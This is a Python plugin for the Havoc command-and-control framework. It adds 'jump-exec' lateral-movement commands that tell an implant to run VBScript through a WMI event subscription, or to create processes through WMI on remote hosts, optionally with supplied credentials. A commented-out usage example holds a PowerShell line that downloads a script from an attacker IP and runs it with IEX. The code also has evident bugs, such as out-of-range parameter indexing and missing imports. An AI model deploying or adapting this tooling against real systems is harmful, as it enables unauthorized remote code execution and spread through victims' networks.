from havoc import Demon, RegisterCommand, RegisterModule
import re

class MyPacker:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8" )
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

    def addWstr(self, s):
        s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s)+2, s)
        self.size += calcsize(fmt)

    def addbytes(self, b):
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size += calcsize(fmt)

    def addbool(self, b):
        fmt = '<I'
        self.buffer += pack(fmt, 1 if b else 0)
        self.size += calcsize(fmt)

    def adduint32(self, n):
        fmt = '<I'
        self.buffer += pack(fmt, n)
        self.size += calcsize(fmt)

    def addshort(self, n):
        fmt = '<h'
        self.buffer += pack(fmt, n)
        self.size += calcsize(fmt)

def wmi_eventsub( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = MyPacker()
    demon  = Demon( demonID )

    # parse parameters that contain quotes
    params = ' '.join(params)
    params = re.findall(r'".*?"|[^ ]+', params)
    params = [param.strip('"') for param in params]
    params = params[1:]
    num_params = len(params)

    target   = ''
    username = ''
    password = ''
    domain   = ''
    is_current = True

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return True

    if num_params > 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return True

    target = f'\\\\{params[ 0 ]}\\ROOT\\SUBSCRIPTION'

    try:
        with open(params[ 1 ], 'r') as f:
            vbscript = f.read()
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid vbscript path" )
        return True

    if num_params > 2 and num_params < 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return True

    if num_params == 5:
        is_current = False
        username = params[ 3 ]
        password = params[ 4 ]
        domain   = params[ 5 ]

    packer.addWstr(target)
    packer.addWstr(domain)
    packer.addWstr(username)
    packer.addWstr(password)
    packer.addWstr(vbscript)
    packer.addbool(is_current)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run a VBS script in {target} via wmi" )

    demon.InlineExecute( TaskID, "go", "EventSub/bin/EventSub.x64.o", packer.getbuffer(), False )

    return TaskID

def wmi_proccreate( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = MyPacker()
    demon  = Demon( demonID )

    # parse parameters that contain quotes
    params = ' '.join(params)
    params = re.findall(r'".*?"|[^ ]+', params)
    params = [param.strip('"') for param in params]
    params = params[1:]
    num_params = len(params)

    target     = ''
    username   = ''
    password   = ''
    domain     = ''
    command    = ''
    is_current = True

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return True

    if num_params > 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return True

    target  = f'\\\\{params[ 0 ]}\\ROOT\\CIMV2'
    command = params[ 1 ]

    if num_params > 2 and num_params < 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return True

    if num_params == 6:
        is_current = False
        username = params[ 2 ]
        password = params[ 3 ]
        domain   = params[ 4 ]

    packer.addWstr(target)
    packer.addWstr(domain)
    packer.addWstr(username)
    packer.addWstr(password)
    packer.addWstr(command)
    packer.addbool(is_current)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run a VBS script in {target} via wmi" )

    demon.InlineExecute( TaskID, "go", "ProcCreate/bin/ProcCreate.x64.o", packer.getbuffer(), False )

    return TaskID

RegisterModule( "jump-exec", "lateral movement module", "", "[exploit] (args)", "", ""  )
RegisterCommand( wmi_eventsub, "jump-exec", "wmi-eventsub", "Run a VBscript via WMI for lateral movement", 0, "target local_script_path <otp:username> <otp:password> <otp:domain>", "10.10.10.10 /tmp/demon.vba" )
# TODO: ProcCreate.x64.o fails with Symbol not found: _ZTV10_com_error
#RegisterCommand( wmi_proccreate, "jump-exec", "wmi-proccreate", "Create a process via WMI for lateral movement", 0, "target command <otp:username> <otp:password> <otp:domain>", "10.10.10.10 \"powershell.exe (new-object system.net.webclient).downloadstring('http://192.168.49.100:8888/run.txt') | IEX\"" )
